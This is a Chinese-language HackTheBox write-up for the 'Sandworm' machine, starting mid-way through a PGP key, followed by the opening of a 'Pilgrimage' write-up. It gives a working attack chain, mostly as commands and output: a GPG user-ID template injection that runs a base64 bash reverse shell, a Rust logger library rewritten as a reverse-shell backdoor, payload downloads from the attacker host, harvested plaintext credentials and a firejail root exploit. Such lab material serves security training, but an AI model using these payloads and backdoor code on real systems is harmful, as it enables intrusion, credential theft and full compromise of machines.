xmU8ICwLP9hW35LfxqsweYLcFmHtx5Li/9XLv\njRJjTu05tYn+9pUdDqVJT5/w1KpaffPXEwLPEaie8fCy9F/uPvEQvht5Wi2DVSQ2\nRosmqdNYF+qSb/tEpicpW/4GLA0XQtSM0VB/esHMrFWJfLLnX9k=\n=/YXP\n-----END PGP PRIVATE KEY BLOCK-----\n```\n\n### 制作和验证签名\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# echo 'life-time'|gpg --clear-sign \n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# echo 'life-time'|gpg --clear-sign  \n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\nlife-time\n-----BEGIN PGP SIGNATURE-----\n\niQGyBAEBCgAdFiEEmdxh848T1r2yc2sljiKfWGUL+z4FAmSdmXoACgkQjiKfWGUL\n+z4BqQv44IchdXncKQYSbLmxrhsYSonbEc1s4oIsA2IeErTUHdwikjAJ9HE7xDjx\ndfUBhQNDrBpr0ZwuNPtcA+2w6/N5cyCT8i29skG4Oh2s59qSZc8MXtOecI6jPv3i\nUc5z0XxQlUgRXtO11E2mx125IZZD5CkAlLfpPwrU6eDHWRsk03wyBTYz8kj0Xk3u\nZYRljKjTvYICLD39sy+W93Hi9matS89ud/sPjsPFvNfgOlwZoScJCxpqLQ5fGn5b\nLGZqgBDVdFb4LdrCuTo6NdP919oywvmmCtPBkLpdnk6zVAtggDs7vJW3LAy+MkFM\nKaEWxX2GBlGHeTdzSIpHtzCVYF1uMihKH8/JdgQCFKGWQDy8uZxvX1WBlBfSm4UE\nWm0Ts9nCP28c91mvfH2IrmR55St+v057vQ1OTIuqXxYEXu2HkRTY0EiZdXdgc8Mc\nesvp8bhfnfHeggIbUczFGBjf71vdGYCFJMvivZGByB4dI3TY3gGChsY54yD4+egM\nwSK3cnU=\n=7bQW\n-----END PGP SIGNATURE-----\n```\n\n![image-20230629224817688](Hackthebox-Sandworm/image-20230629224817688.png)\n\n这里我们的 {{7*7}} 成功变成了 49，证明确实存在 SSTI 漏洞\n\n## 反弹 Shell\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# echo \"bash -i >& /dev/tcp/10.10.16.48/4444 0>&1\"|base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\n```\n\n首先我们将 reverse shell 转换为 base64 编码\n\n```\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }}\n```\n\n然后构造我们的 Reverse Shell\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg --edit-key LucifielHack@qq.com\ngpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n私钥可用。\n\ngpg: 正在检查信任度数据库\ngpg: marginals needed: 3  completes needed: 1  trust model: pgp\ngpg: 深度：0  有效性：  1  已签名：  0  信任度：0-，0q，0n，0m，0f，1u\ngpg: 下次信任度数据库检查将于 2025-06-28 进行\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1). {{7*7}} <LucifielHack@qq.com>\n\ngpg> adduid\n真实姓名： {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }}\n电子邮件地址： LucifielHack@qq.com\n注释： \n您选定了此用户标识：\n    “{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>”\n\n更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？ o\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  {{7*7}} <LucifielHack@qq.com>\n[ 未知 ] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>\n```\n\n```\ngpg> trust\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  {{7*7}} <LucifielHack@qq.com>\n[ 未知 ] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>\n\n请决定您对这名用户能否正确地验证其他用户密钥\n（通过查看护照，检查不同来源的的指纹等等）的相信程度\n\n  1 = 我不知道或不作答\n  2 = 我不相信\n  3 = 我勉强相信\n  4 = 我完全相信\n  5 = 我绝对相信\n  m = 回到主菜单\n\n您的决定是什么？ 5\n您真的要把这个密钥设置成绝对信任？(y/N) y\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  {{7*7}} <LucifielHack@qq.com>\n[ 未知 ] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>\n\ngpg> uid 1\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)* {{7*7}} <LucifielHack@qq.com>\n[ 未知 ] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>\n\ngpg> deluid\n真的要移除此用户标识吗？(y/N) y\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 未知 ] (1). {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC80NDQ0IDA+JjEK\" | base64 -d | bash').read() }} <LucifielHack@qq.com>\n\ngpg> save\n```\n\n### 导出公钥\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ┌──(root㉿kali)-[~/Desktop]\n└─# gpg --armor --export LucifielHack@qq.com > public.key\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat public.key      \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmQGNBGSdlHIBDADT20d9aSJjEaF5etEV39gJBLc7c35Q7cgwBUi9aW0FcrcYYWV5\nAJJ2xloIWbavsgG1bjPo2SwgP0iRscX6yFRQ21OtVibkWB6fRfi7BWxc/mxEo0XU\nlFO4ufb2taRMRmlxvg78xwia7WXIVF+UR/iHJeH/U+UbVh0hFZNQKrKiRHlzWagb\nyGhNz8LDHMIPWUp1AiVqoMNXv4TwRM+SUMsQi7K862oixnJAjrgThIn6bwOPNnPm\nspi7QUj8JcjEBvicVXlCaD1WkfkeNDHMq1xH3LW5/2gzTauouLsxBdAv3soImLXE\nhuyxG5arc6oekAGJ3wpizA1g8pJQ5DnUUe419cBnL0M+tMgZMboOauEOP1BLD9ZH\npwaktBoQnUXaj4jY3jHFHhyP+rWDvcFJshm/zy05nAKqRtA8cidlYtEpAuJrAArM\nhwg6v73HVkpjiSWFihYRZhBUtjJsEekUzx7eyZtkb+KH7wmBqEgpBPoNZJR7HjD5\nSohFOy3XWJe87UcAEQEAAbS2e3sgc2VsZi5fX2luaXRfXy5fX2dsb2JhbHNfXy5f\nX2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyAiWW1GemFD\nQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0ME9DODBORFEwSURBK0pq\nRUsiIHwgYmFzZTY0IC1kIHwgYmFzaCcpLnJlYWQoKSB9fSA8THVjaWZpZWxIYWNr\nQHFxLmNvbT6JAdQEEwEKAD4WIQSZ3GHzjxPWvbJzayWOIp9YZQv7PgUCZJ2cCAIb\nAwUJA8JnAAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRCOIp9YZQv7PjmbDACL\nxvM6NGYzKAvWSq8+YCFaoGayRrmdcxyFHVx/E06QaQGjyF8QSwA8xrvZR+/gT4Us\ngiFIgllk+n5s3Pu84S+TQir5AEMb68MAMHGXdGUqqv8KI82X90z8x9QZxOw7hHPU\nrSp+uPecitxtI2j6uNNr/hx2KPTGlgyP+ns6NiAjGu+jIs0Z8fCtEzRTfcjgmYC3\naMgrfWmqy/S8E0TISNYm9htN8o9b+E1iVNCcE+Jc4BJULJnWwpEgjhsER0aWdCIM\nOHuLHBCSGKKHFA0qmi39wuTWcjS3cd6NFVN4OVr124IKjV1vE/0Wo6VlSW1UuLYi\nZau812E1KwsVH/ASo1tcYCpmw282wt8zhICyJATPNExIjsTexMQoAtuNPFN2rs8k\n7Km3yXy1jv29D2qw4RFjXYhcWNtnkzNG0B678w4uDOlU5wsge3slLdhx9jWXcE8d\nPomLxGrC56KNbpfpMrWVMt2WoXzvavLY05lzGkKzJTXESIQ8lvA8RkVNMlDpf4u5\nAY0EZJ2UcgEMANbLfcUVhcrdZuaRl4NnmzKabZ3swIZmBSO5ICQCw12Jqr6KlVa2\nvFPtdOdTMnJwrGGJYqCEamek4M6RILovlxOfdDLaY+49TjEnDev+6GRk18OAO6gk\nMYPpCfuBFk3XIK49p3BH9ucJQzMvJ6oa29L2a/pmlw5kA/aUDUteXJZUfHSYSd91\nMBQQ8oIUzHe2SDB9effwtKWdM6IjWviZ5TpILF8v4HItueVE5dinxTZIaxHko0d0\nRcEQV9zdjkZ1ZQjFVJr5Awz6JQGhf7lcPN60YxZAv++3hbtN7tv7l3jJuWxdDwsB\nAAgOxuzk9Y7QmFdNAW9xhSLL3Ee4cWaj+RXq5hP9Cw60MzfpDaXHyY/TOtCC6VU3\nu6ERRAfQ0GwmfSHzJZJtIVCu08NE3SOriLHbvGggdUTwlXtqaHg4PfLMwvMEEHN3\nw/PmLGAE4bPmjUIB9tieloLMW/aJA79W7kcKpsy355dEZUojtzX7kRXm+ud30hqY\nUKrVy5EvGypDkQARAQABiQG8BBgBCgAmFiEEmdxh848T1r2yc2sljiKfWGUL+z4F\nAmSdlHICGwwFCQPCZwAACgkQjiKfWGUL+z7cXgv+LvtkBNdMqg5GcG3+/Ly6B1os\n/jkR3R0bOO27CrUOw/Yt4KY71/Eza3+evid6u3qmBjVaIg09qZdDySThV/wVX0zP\n1H095nIcNCxqFt8YIMjx9VfyI4yCYTWVEEYPlgTVEPkpJEFrd98v9HS3lZbEJ5Ha\nJxdp5/n09HhzfCHyNo4lVSgkeJr7Zo37/tppIUAgIWRzXHg+f0du0087K8Q0KVO8\nOkKtfGoXWB/4wrPMeQMVaOke5SjN3T03OGrit462wYi4Iaucbck6qI3HjLCsjQat\nGNV2yIbVbhIH1oAznu6Gd3XxbDrXOLvWtt8RkWDDPbblz/2EiC14VPhkPtJe9o0t\ngryqJixVfFjdlTU+8ZlPCAsCz/YVt+S38arMHmC3BZh7ceS4v/Vy740SY07tObWJ\n/vaVHQ6lSU+f8NSqWn3z1xMCzxGonvHwsvRf7j7xEL4beVotg1UkNkaLJqnTWBfq\nkm/7RKYnKVv+BiwNF0LUjNFQf3rBzKxViXyy51/Z\n=vr51\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n### 制作和验证签名\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# echo 'life-time'|gpg --clear-sign --out signed_message.key\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat signed_message.key \n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\nlife-time\n-----BEGIN PGP SIGNATURE-----\n\niQGzBAEBCgAdFiEEmdxh848T1r2yc2sljiKfWGUL+z4FAmSdnkAACgkQjiKfWGUL\n+z6ufgwA0imOKszK563JTpz9aRBZxdtNne4Y14u7FFHjgTT7UVQabBOeN143fnqv\nBIS9/6KcHa4gurrnU87ouf/YNxgC2FPZ5k1nDY04iJJDnnkMEvpiSNgmWy2frIvp\ngfLRd4kDJpwnkC6NE7ur8wxkcn2cpSUTsOgsVMhksazfAX6LJpOYmVSuwTRg6UYb\nqKJnfeD7yDsXMV3kfGE9Kt3mo2uCnTKoomjKMYpnx4ZpP0Dcj8joxRXRFhP/UVbG\nRGNlksQDGDBbA0Stfu90zyOYmLRZXwuxiDb4xUHKA9PC4fu8fjk6/pA4rWiKXiU2\nWaZ5KRUxoPTxI8w3GUUae+R9fXPDBlAuICSLnM/Rbxo6pMZ3LOg5bgzUsIJhm63N\nxCdJUB1bjQ8NXvNpy+dKZa3vd33M1kqq/MdzUnUQ0n6+M4LwUGoZYr+waO3XG2K1\n4SVSgMlT36X9oKToDe93azhWwbGRcGNSkoo2EuADEjv5S7YfT/w8x8hvGfwfqmEI\nLf9gYb/D\n=26lf\n-----END PGP SIGNATURE-----\n```\n\n### 监听端口\n\n```\nnc -nvlp 4444\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444 \nlistening on [any] 4444 ...\nconnect to [10.10.16.48] from (UNKNOWN) [10.10.11.218] 55382\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\n/usr/local/sbin/lesspipe: 1: dirname: not found\natlas@sandworm:/var/www/html/SSA$ whoami&&id^M\n```\n\n直接按回车会变成 ^M，去解决下伪终端的问题\n\n```\nCtrl+Z 返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n\n即可成功解决这个问题\n\n```\natlas@sandworm:/var/www/html/SSA$ whoami\nCould not find command-not-found database. Run 'sudo apt update' to populate it.\nwhoami: command not found\natlas@sandworm:/var/www/html/SSA$ id\nuid=1000(atlas) gid=1000(atlas) groups=1000(atlas)\natlas@sandworm:/var/www/html/SSA$ ls\nSSA\natlas@sandworm:/var/www/html/SSA$ cd SSA\natlas@sandworm:/var/www/html/SSA/SSA$ ls\napp.py       models.py    src     submissions\n__init__.py  __pycache__  static  templates\n```\n\n成功拿到一个 shell，但是这里看着像是在容器里，而且也没有 flag\n\n# 权限提升\n\n## silentobserver\n\n```\natlas@sandworm:~$ ls -la\ntotal 44\ndrwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .\ndrwxr-xr-x 4 nobody nogroup 4096 May  4 15:19 ..\nlrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null\n-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout\n-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc\ndrwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache\ndrwxrwxr-x 3 atlas  atlas   4096 Feb  7 10:30 .cargo\ndrwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .config\ndrwx------ 4 atlas  atlas   4096 Jun 29 15:10 .gnupg\ndrwxrwxr-x 6 atlas  atlas   4096 Feb  6 10:33 .local\n-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile\ndrwx------ 2 atlas  atlas   4096 Feb  6 10:34 .ssh\n```\n\n在用户目录下有一个 `.config`文件夹\n\n```\natlas@sandworm:~/.config$ ls -la\ntotal 12\ndrwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .\ndrwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..\ndr-------- 2 nobody nogroup   40 Jun 29 08:31 firejail\ndrwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie\n```\n\n`.config`目录下有`firejail`，确认是在沙箱中\n\n```\natlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ls -la\ntotal 12\ndrwxrwx--- 2 nobody atlas 4096 May  4 17:30 .\ndrwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ..\n-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json\natlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json\n{\n    \"__meta__\": {\n        \"about\": \"HTTPie session file\",\n        \"help\": \"https://httpie.io/docs#sessions\",\n        \"httpie\": \"2.6.0\"\n    },\n    \"auth\": {\n        \"password\": \"quietLiketheWind22\",\n        \"type\": null,\n        \"username\": \"silentobserver\"\n    },\n    \"cookies\": {\n        \"session\": {\n            \"expires\": null,\n            \"path\": \"/\",\n            \"secure\": false,\n            \"value\": \"eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA\"\n        }\n    },\n    \"headers\": {\n        \"Accept\": \"application/json, */*;q=0.5\"\n    }\n}\n```\n\n最后在 `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json`中发现了用户 `silentobserver`的密码`quietLiketheWind22`\n\n```\nUsername = silentobserver\nPassword = quietLiketheWind22\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh silentobserver@10.10.11.218\nsilentobserver@10.10.11.218's password: \nWelcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu Jun 29 03:21:56 PM UTC 2023\n\n  System load:           0.0\n  Usage of /:            89.6% of 11.65GB\n  Memory usage:          22%\n  Swap usage:            0%\n  Processes:             215\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.218\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:e9e3\n\n  => / is using 89.6% of 11.65GB\n  => There is 1 zombie process.\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Thu Jun 29 15:21:58 2023 from 10.10.16.48\nsilentobserver@sandworm:~$ whoami&&id\nsilentobserver\nuid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)\n```\n\n成功得到一个 User 权限的 Shell\n\n```\nsilentobserver@sandworm:~$ cat user.txt \n8a61464d123533ae2536d7e54644b889\n```\n\n成功得到 User 权限的 Flag 文件\n\n## Root\n\n```\n2023/06/29 15:30:01 CMD: UID=0    PID=495842 | /bin/sh -c cd /opt/tipnet && /bin/echo \"e\" | /bin/sudo -u atlas /usr/bin/cargo run --offline\n```\n\n运行 pspy，检测到 root 用户正在用户 atlas 的上下文中运行用 Rust 开发的 tipnet 项目\n\n### tipnet\n\n```\nsilentobserver@sandworm:/opt/tipnet/target/debug$ ./tipnet \n                                                     \n             ,,                                      \nMMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    \nP'   MM   `7               MMN.    M           MM    \n     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  \n     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    \n     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    \n     MM      MM   MM   ,AP M     YMM YM.    ,  MM    \n   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo \n                  MM                                 \n                .JMML.                               \n\n\nSelect mode of usage:\na) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n```\n\n### logger\n\n```\nsilentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs \nextern crate chrono;\n\nuse std::fs::OpenOptions;\nuse std::io::Write;\nuse chrono::prelude::*;\n\npub fn log(user: &str, query: &str, justification: &str) {\n    let now = Local::now();\n    let timestamp = now.format(\"%Y-%m-%d %H:%M:%S\").to_string();\n    let log_message = format!(\"[{}] - User: {}, Query: {}, Justification: {}\\n\", timestamp, user, query, justification);\n\n    let mut file = match OpenOptions::new().append(true).create(true).open(\"/opt/tipnet/access.log\") {\n        Ok(file) => file,\n        Err(e) => {\n            println!(\"Error opening log file: {}\", e);\n            return;\n        }\n    };\n\n    if let Err(e) = file.write_all(log_message.as_bytes()) {\n        println!(\"Error writing to log file: {}\", e);\n    }\n}\n```\n\n需要把 `lib.rs`修改为我们自己的内容\n\n```\n\n//Just put the below code in lib.rs\n\nextern crate chrono;\n\nuse std::fs::OpenOptions;\nuse std::io::Write;\nuse chrono::prelude::*;\nuse std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\npub fn log(user: &str, query: &str, justification: &str) {\n    let now = Local::now();\n    let timestamp = now.format(\"%Y-%m-%d %H:%M:%S\").to_string();\n    let log_message = format!(\"[{}] - User: {}, Query: {}, Justification: {}\\n\", timestamp, user, query, justification);\n\n    let mut file = match OpenOptions::new().append(true).create(true).open(\"/opt/tipnet/access.log\") {\n        Ok(file) => file,\n        Err(e) => {\n            println!(\"Error opening log file: {}\", e);\n            return;\n        }\n    };\n\n    if let Err(e) = file.write_all(log_message.as_bytes()) {\n        println!(\"Error writing to log file: {}\", e);\n    }\n    let sock = TcpStream::connect(\"10.10.16.48:4444\").unwrap();\n\n    // a tcp socket as a raw file descriptor\n    // a file descriptor is the number that uniquely identifies an open file in a computer's operating system\n    // When a program asks to open a file/other resource (network socket, etc.) the kernel:\n    //     1. Grants access\n    //     2. Creates an entry in the global file table\n    //     3. Provides the software with the location of that entry (file descriptor)\n    // https://www.computerhope.com/jargon/f/file-descriptor.htm\n    let fd = sock.as_raw_fd();\n    // so basically, writing to a tcp socket is just like writing something to a file!\n    // the main difference being that there is a client over the network reading the file at the same time!\n\n    Command::new(\"/bin/bash\")\n        .arg(\"-i\")\n        .stdin(unsafe { Stdio::from_raw_fd(fd) })\n        .stdout(unsafe { Stdio::from_raw_fd(fd) })\n        .stderr(unsafe { Stdio::from_raw_fd(fd) })\n        .spawn()\n        .unwrap()\n        .wait()\n        .unwrap();\n}\n```\n\n```\nsilentobserver@sandworm:/opt/crates/logger/src$ rm lib.rs \nsilentobserver@sandworm:/opt/crates/logger/src$ wget http://10.10.16.48/lib.rs\n--2023-06-29 15:38:52--  http://10.10.16.48/lib.rs\nConnecting to 10.10.16.48:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1921 (1.9K) [application/rls-services+xml]\nSaving to: ‘lib.rs’\n\nlib.rs                                               100%[======================================>]   1.88K  --.-KB/s    in 0.1s    \n\n2023-06-29 15:38:53 (17.3 KB/s) - ‘lib.rs’ saved [1921/1921]\n```\n\n然后使用 nc 监听一个端口\n\n```\nnc -nvlp 4444\n```\n\n然后等待上线就行\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.48] from (UNKNOWN) [10.10.11.218] 36026\nbash: cannot set terminal process group (496122): Inappropriate ioctl for device\nbash: no job control in this shell\natlas@sandworm:/opt/tipnet$\n```\n\n这次反弹的 shell 比第一个 shell 多了一个 jailer 权限，输入 find 寻找可提权的地方\n\n## firejail\n\n```\natlas@sandworm:/opt/tipnet$ find / -perm -4000 -user root 2>/dev/null\nfind / -perm -4000 -user root 2>/dev/null\n/usr/local/bin/firejail\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/fusermount3\n```\n\n> https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25\n\n提权可以使用上面的脚本\n\n```\nsilentobserver@sandworm:/tmp$ wget http://10.10.16.48/exploit.py\n--2023-06-29 15:45:08--  http://10.10.16.48/exploit.py\nConnecting to 10.10.16.48:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 7955 (7.8K) [text/x-python]\nSaving to: ‘exploit.py’\n\nexploit.py                                           100%[===========================================>]   7.77K  40.9KB/s    in 0.2s    \n\n2023-06-29 15:45:10 (40.9 KB/s) - ‘exploit.py’ saved [7955/7955]\n\nsilentobserver@sandworm:/tmp$ chmod +x exploit.py\n```\n\n上传到 /tmp 目录，并给执行权限\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 5555 \nlistening on [any] 5555 ...\nconnect to [10.10.16.48] from (UNKNOWN) [10.10.11.218] 33806\nbash: cannot set terminal process group (1608): Inappropriate ioctl for device\nbash: no job control in this shell\natlas@sandworm:/opt/tipnet$ python3 -c \"import pty;pty.spawn('/bin/bash')\"\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\natlas@sandworm:/opt/tipnet$ cd /tmp\ncd /tmp\natlas@sandworm:/tmp$ python3 exploit.py\npython3 exploit.py\nYou can now run 'firejail --join=1776' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.\n```\n\n执行脚本，然后再开一个 shell，去执行脚本给我们的 `firejail --join=1776`\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.48] from (UNKNOWN) [10.10.11.218] 57828\nbash: cannot set terminal process group (1833): Inappropriate ioctl for device\nbash: no job control in this shell\natlas@sandworm:/opt/tipnet$ firejail --join=1776\nfirejail --join=1776\nWarning: cleaning all supplementary groups\nchanging root to /proc/1776/root\nChild process initialized in 9.03 ms\nsu -\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功提权到 root\n\n```\ncat /root/root.txt\ne24cdfa390562eed1f0d97513bbf8db4\n```\n\n成功拿到 root 权限的 flag 文件\n\n![image-20230629235646212](Hackthebox-Sandworm/image-20230629235646212.png)\n","tags":["Hackthebox"]},{"title":"Pilgrimage - Hackthebox","url":"/2023/06/28/Hackthebox/Easy/Hackthebox-Pilgrimage/","content":"\n# Hackthebox - Pilgrimage\n\n## 靶场信息\n\n![Pilgrimage](Hackthebox-Pilgrimage/Pilgrimage.png)\n\n## 信息收集\n\n### Nmap\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.219\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 00:17 CST\nWarning: 10.10.11.219 giving up on port because retransmission cap hit (10).\nNmap scan report for pilgrimage.htb (10.10.11.219)\nHost is up (0.49s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)\n|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)\n|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)\n80/tcp open  http    nginx 1.18.0\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-title: Pilgrimage - Shrink Your Images\n| http-git: \n|   10.10.11.219:80/.git/\n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file 'description' to name the...\n|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...\n|_http-server-header: nginx/1.18.0\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 